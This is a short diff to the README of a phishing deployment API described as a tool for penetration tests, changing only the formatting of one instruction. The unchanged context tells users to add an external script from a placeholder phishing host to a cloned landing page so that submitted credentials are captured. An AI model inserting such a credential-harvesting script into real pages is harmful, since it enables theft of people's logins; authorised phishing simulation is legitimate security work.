@@ -79,7 +79,7 @@ Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to 
 
 <b>If you don't wish to use a pre-populated landing page template or one doesn't exist that you would like to use, feel free to create or clone your own.  Simply : </b><br><br>
 
-1) Add the external script source in the <head> element
+1) Add the external script source in the `<head>` element
 
 	`<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>`
 
